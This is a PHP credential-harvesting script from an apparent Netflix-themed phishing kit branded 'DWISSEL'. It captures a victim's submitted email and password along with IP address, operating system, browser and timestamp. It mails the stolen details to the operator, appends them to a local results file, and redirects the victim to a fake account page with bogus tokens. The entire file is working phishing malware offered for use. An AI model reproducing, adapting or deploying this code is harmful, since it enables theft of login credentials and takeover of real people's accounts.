<?php
header('Access-Control-Allow-Origin: *');
session_start();
sleep(2);
include("../../../../Email.php");
require "../os.php";
require "../geoplugin.php";
$DATE = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$IP = $_SERVER["REMOTE_ADDR"];
@$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$MAIL    = $_SESSION['_emaill_']        = $_POST['email'];
$PASS      = $_SESSION['_passwordd_']     = $_POST['password'];
function validate_email($MAIL){
$regexp = "/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD";
if (!preg_match ($regexp, $MAIL)) return false;
list ($user, $domain) = explode ("@", $MAIL);
if (!checkdnsrr ($domain, 'MX'))
    return false;

return true;
}
function Error()
{	
    $ER = sha1(md5(gmdate('')));
    $ERR = "UnknownInfo";
    $erreur = header("Location: ../../login/index.php?AccessFailed=".$ERR."&TokenError=".$ER."");
    return $erreur;
}


	if ((isset($_POST['email'])) && (strlen($_POST['password']) >= 4)) 

	{
    if(validate_email($MAIL)) {

	$msg = "

<div style='background: -webkit-linear-gradient(#E9E9E9, #B2B2B2 21px, #6A6A6A 1px, #000, #000 23px);margin: 3em auto;border-radius: 5px;box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6), 0 22px 70px 4px rgba(0, 0, 0, 0.56), 0 0 0 1px rgba(0, 0, 0, 0.3);padding: 3px 5px;text-align: left;width:50em;font-size: 13px;'><center><span style='font: normal normal 13px/20px&#39;Lucida Sans Unicode&#39;;text-align:center;z-index: 2;position:relative;top: -0.18em;text-shadow: 0px 1px 0px rgba(255, 255, 255, 0.6);color: #444;'>DWISSEL</span></center>
	

	
<pre style ='position: relative;color: #DDD;padding:5 -5px;font-family:Verdana;line-height: 1.2em;margin:1.7em auto;max-height:1800px;overflow-x:hidden;'>

		            	
                    			
                             <span style='position:relative;top:-20px;padding:10px;border:1px dashed blue;border-radius: 8px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;♣ LOGIN ♣&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>		

							 
        <span style='color: #55FF55;'>$ Email~:</span>  ".$_POST['email']."
			
        <span style='color: #55FF55;'>$ Password~:</span>  ".$_POST['password']."								
                            
                             
                             <span style='position:relative;top:-20px;padding:10px;border:1px dashed blue;border-radius: 8px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;♣ MORE INFO ♣&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>				

	
	
        <span style='color: #55FF55;'>$ IP~:</span>  <span style='color:#00FFFF'>".$IP."</span>	
	
        <span style='color: #55FF55;'>$ Operating System~:</span>  <span style='color:#00FFFF'>".$OS."</span>
		
        <span style='color: #55FF55;'>$ Browser~:</span>  <span style='color:#00FFFF'>".$browserTy_Version."</span>
		
        <span style='color: #55FF55;'>$ Date~:</span>  <span style='color:#00FFFF'>".$DATE."</span>
		
		
	

        <span style='color: #55FF55;'>>_</span> exit;

	</pre>
</div>


";
$subject = "".$_POST['email']." ♣NETFLIX LOG♣ ".$_SESSION['CountryName']."";
$headers = "From: Dwissel <log@dwissel.tn>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($email,$subject,$msg,$headers);

header("Location: ../home.php?CustomerAccount-ID=".sha1(md5(gmdate('bled Kizebbbbii')))."&TokenAccess=".strtoupper(sha1(256))." ");

$localrez ="###################################################
###################################################
=-=-=-=-=-=-=-=-=-=- ♣ LOGIN ♣ =-=-=-=-=-=-=-=-=-

Email: ".$_POST['email']."
Login: ".$_POST['password']."

=-=-=-=-=-=-=-=-=-=- ♣ MORE INFO ♣ =-=-=-=-=-=-=-	

IP: ".$IP."
Operating System: ".$OS."
Browser: ".$browserTy_Version."
Date: ".$DATE."

=-=-=-=-=-=-=-=-=-=- ♣ DWISSEL ♣ =-=-=-=-=-=-=-=-
";
	
$localr3z = fopen("../../../../REZLT/LOGIN.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);
}
else {
	echo ERROR();
	}
}
	else {echo ERROR();}	 
?>